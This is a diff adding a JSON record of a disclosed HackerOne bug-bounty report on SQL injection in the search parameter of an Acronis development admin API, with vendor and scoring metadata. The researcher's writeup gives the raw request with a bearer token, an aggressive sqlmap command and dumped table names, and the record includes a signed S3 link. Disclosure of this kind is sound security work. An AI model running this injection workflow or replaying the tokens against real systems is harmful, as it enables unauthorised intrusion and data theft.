@@ -1,0 +1,169 @@
+{
+  "id": 923020,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC85MjMwMjA=",
+  "url": "https://hackerone.com/reports/923020",
+  "title": "SQL injection on admin.acronis.host development web service",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2020-07-14T03:36:27.941Z",
+  "submitted_at": "2020-07-14T03:36:27.941Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "stealthy",
+    "url": "/stealthy",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/c0mgzdrl4rsdzvgu9hol4owyfk2x/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef"
+    },
+    "is_me?": false,
+    "cleared": true,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 13428,
+    "url": "https://hackerone.com/acronis",
+    "handle": "acronis",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/e54TDdWdgLKsH3h1oFpK26bq/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/e54TDdWdgLKsH3h1oFpK26bq/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Acronis",
+      "twitter_handle": "Acronis",
+      "website": "https://www.acronis.com",
+      "about": "Complete integrated cybersecurity and data protection for MSPs and IT teams"
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2021-06-22T18:12:42.683Z",
+  "bug_reporter_agreed_on_going_public_at": "2021-06-22T18:12:42.597Z",
+  "team_member_agreed_on_going_public_at": "2021-06-22T15:46:57.045Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "**Summary:**\nI found an Acronis domain and started hunting on it. During my hunting, I found an admin panel and was able to access this panel (separate report inbound). It was easy to gain access to this panel, and I was not sure if it was for testing purposes or a genuine admin panel. I played around with minor settings to see if I could change some content on the main page and ensure that this was a real admin panel. I put a quote in the search bar for indexing dashboard pages and intercepted the request. Then I realized all requests are through the administrator API, which I now have access to and an authorization bearer token. Admin API access, combined with the entire site index in the panel (including all content for all pages), confirmed that I am in a real live admin panel.\n\nNext, I noticed the quote returned a server error in the API. I  tested an SQL injection (along with one other critical bug) and confirmed its presence. I can view three databases, and I dumped the table names for one of the databases to see what type of information it contained. In the database, there are tables named `users`, `password_resets`, and more. Furthermore, the login redirected to the main Acronis website, so I knew this data is quite sensitive. I only explored nonsensitive data. The extent of what I did with the SQL injection is diclosed in this report below.\n\nI understand this domain is not rated critical, but I set it because of the severity of the bug.\n\n**Steps to Reproduce:**\nVisit the admin panel for Acronis hosting.\n\n    https://admin.acronis.host/\n\nLogin with the given credentials and visit the pages section.\n\n    https://admin.acronis.host/#/pages\n\nHere input any data and intercept the request. Below is a copy of the raw request.\n\n```text\nGET /api/admin/pages?page=1&limit=100&sort=%2Btype&filter=%7B%7D&search=* HTTP/1.1\nHost: dev.acronis.host\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0\nAccept: application/json, text/plain, */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nAuthorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwOlwvXC9kZXYuYWNyb25pcy5ob3N0XC9hcGlcL2F1dGhcL2xvZ2luIiwiaWF0IjoxNTk0Njk1MzgzLCJleHAiOjE1OTQ3MzEzODMsIm5iZiI6MTU5NDY5NTM4MywianRpIjoiSnBkczlKY0x6VHF5QXphOCIsInN1YiI6MSwicHJ2IjoiODdlMGFmMWVmOWZkMTU4MTJmZGVjOTcxNTNhMTRlMGIwNDc1NDZhYSJ9._K-nn1elXhqx1RNszBeZFwX1dbyCVtv63m_-DGp7UmE\nOrigin: https://admin.acronis.host\nConnection: close\nReferer: https://admin.acronis.host/dev.acronis.host/en-US/products/4372\n\n```\n\nThe `search` parameter is vulnerable. Save the request I provided as a text file on your desktop and run the following command with SQLMap.\n```\nsudo python sqlmap.py -r {PATH TO FILE} --level 5 --risk 3 --random-agent --dbs\n```\n\nThis will drop the following three databases.\n\n{F906431}\n\nNext, I used the following flags in SQLMap `-D acronis_site --tables`. The `-D` tells SQLMap which database and `--tables` tells SQLMap to drop table names. I only explored nonsensitive information.\n```text\nDatabase: acronis_site\n[24 tables]\n+----------------------+\n| awards               |\n| failed_jobs          |\n| files                |\n| history_pages        |\n| locales              |\n| migrations           |\n| page_products        |\n| page_translations    |\n| pages                |\n| pages_1              |\n| pages_2              |\n| pages_3              |\n| password_resets      |\n| product_prices       |\n| product_translations |\n| products             |\n| products_1           |\n| related_products     |\n| related_tags         |\n| resources            |\n| tags                 |\n| users                |\n| variables            |\n| webinars             |\n+----------------------+\n```\n\nAfter seeing this, I ceased testing this SQL injection and reported the vulnerability directly to your team.\n\n## Impact\n\nServer-side SQL injection leading to database access and exposure of sensitive information. Reading this information likely allows an attacker to execute remote code by stealing admin password resets and user information.",
+  "bounty_amount": "250.0",
+  "formatted_bounty": "$250",
+  "weakness": {
+    "id": 67,
+    "name": "SQL Injection"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 906431,
+      "file_name": "Screen_Shot_2020-07-13_at_8.30.56_PM.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/tiPCiXJXbLGzgSZWXNQRTxac?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2020-07-13_at_8.30.56_PM.png%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2020-07-13_at_8.30.56_PM.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ6INISVZ3%2F20260509%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260509T151420Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEBwaCXVzLXdlc3QtMiJIMEYCIQCxA0kU9XiY%2BIErAIXnMsMVNtl%2FE5gn07DboF84Ro4GewIhAKcH526HP%2FUTlGNE%2Bn3Z%2BKrZG7OBGUuwQgTF7eN2vM4XKrsFCOX%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5Igxkq1afLOUwAnpcC78qjwVV7NeQwp6c10oAYyQZlXnTn9gI0Ts%2B9KxIUb4X8GpfDoGqGGXzDUQxkGsQu%2BPGy%2F%2FLIf4JfosEHqORZBSn%2FScHH6f8LzV6C0KHK5jRpzQtoK%2F%2BENjjdQs8haxQiuT2ZRFBcypmd%2BAKTGjMSxe4m1XWFhwDwiIhkY4qm7a2FYMp5nDCtx3KQI%2FBZyn8PShdZTH0P%2By7VBQ%2F7qmQfGzhvWv1dz1CZTBIkOuFKsqQPB6Koah6W78OSIGVKi5bgEbMBingtEmJ67j3Yr992mXh%2BvSXohKdY1Y4gWOHtCfjLzyQE5pPInEBsVtBGV7KCZLUfMqzJ9LJ96B9KpY0ChVQl5mGV5zWxAMtbJ5Vs9gGY3RyPhS7bRETfqgxrAx7fcN6s8RmdT7DYDhWzH%2FP0BjJIdJDI7NR5GJuCWE5Jp9qxnUCt%2B4gv3ZC2QMTB8KLoIlR0q2ZYGEK5v6hdyXfuOuDfEJDL50qQ7qcZN5ziQc%2F5dwCpUhkm9D%2FeZ9j08ZPtOjZcuOqBvbaX7fjVDJtqdjKNG7pSWm0UuWgGiY5D7qRTGWtkavFUSB%2FJvd9qFDSqQXdF8tdsMp8xoBVOF6hhDYRtFbvodyM3sZz%2BswB4ngY6NZrwHECBMmTLsy3YGvQcm3XtOS2xP6hv4egpk347yDEi2PK3l1l7eXzvKJanMacTaMuna2%2BFljYwc%2BLcaUCqFEPfbrjl0X7PPFZQ6sjs3K5sSVE4Z8U%2FHhfR0sV2PLc%2BPJwd6ot9QM98J6UZZqNievrEktulW2VN%2Bng2aPiSqIupgmtEbBMp%2FbECVgwy%2FsQPOL%2FvfvMiWb%2F3SSI55L26VjoVhSSgQC2bm2Rxjv%2BMvwUaqLhX2f28%2Fb6Kz6vgIehCdJzML29%2FM8GOrABGc1isADKJTP2ykuKvj%2BPktq52gWZ9Sl8NQxqpeEdGbEYy8HeJ9qEps%2Fx8nQ%2B0D8zhGH1Ra6nI%2B4jtk8iQWWguah%2B34MJnN2L9sLZd3gkqWmOFGbT1viV3Ej8OnaiPBxI5dC5CzXX17If2zHZSygBHyPXnpGECPPipctHHdSAba6Wkg5J0m9bcPvgIkHBVUReeA%2BlLaf37ZKiYx4iHg2UIdedWVwsHggGaWLH0syaN2w%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=049787e11d95d1244476fbf1b798032a5bec300c45f625b1ceb042fcfc4d4cc0",
+      "file_size": 1502401,
+      "type": "image/png",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 117,
+  "voters": [
+    "br0x1337",
+    "m4khn0",
+    "0xtarun",
+    "mr-medi",
+    "orange303",
+    "mad_vima",
+    "tolga",
+    "sw33tlie",
+    "osman1337",
+    "0x3f",
+    "and 107 more..."
+  ],
+  "severity": {
+    "rating": "high",
+    "score": 8.9,
+    "author_type": "Team",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "low",
+      "privileges_required": "none",
+      "user_interaction": "none",
+      "scope": "changed",
+      "confidentiality": "high",
+      "integrity": "high",
+      "availability": "high"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 13996,
+    "asset_type": "OTHER",
+    "asset_identifier": "Other Acronis Domains",
+    "max_severity": "medium"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "id": 61012,
+      "category": "team",
+      "content": "SQL injection was possible on `admin.acronis.host` web service that was used for development purposes only. Acronis security team confirmed that the service did not contain any sensitive data or data of real users. ",
+      "updated_at": "2021-06-22T15:46:04.631Z",
+      "can_view?": true,
+      "can_create?": false,
+      "attachments": [],
+      "user": {
+        "id": 649245,
+        "username": "stushieva",
+        "name": "Sabina",
+        "bio": "",
+        "cleared": false,
+        "verified": false,
+        "website": null,
+        "location": "",
+        "created_at": "2019-06-17T15:01:27.503Z",
+        "url": "https://hackerone.com/stushieva",
+        "hackerone_triager": false,
+        "hackerone_employee": false,
+        "user_type": "hacker",
+        "profile_picture_urls": {
+          "small": "https://profile-photos.hackerone-user-content.com/variants/asyw8mgrl755hxgcgwfxqwfmj383/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef",
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/asyw8mgrl755hxgcgwfxqwfmj383/d9695107bfcd68eeb1c9e0912b109cdae9a6c00c0bda6fd4cbd6d9bdb828840a",
+          "xtralarge": "https://profile-photos.hackerone-user-content.com/variants/asyw8mgrl755hxgcgwfxqwfmj383/4ac84fbe897190579a137d0cf55152b233cdd4f9984435bd80ef67e5e51a0586"
+        }
+      }
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
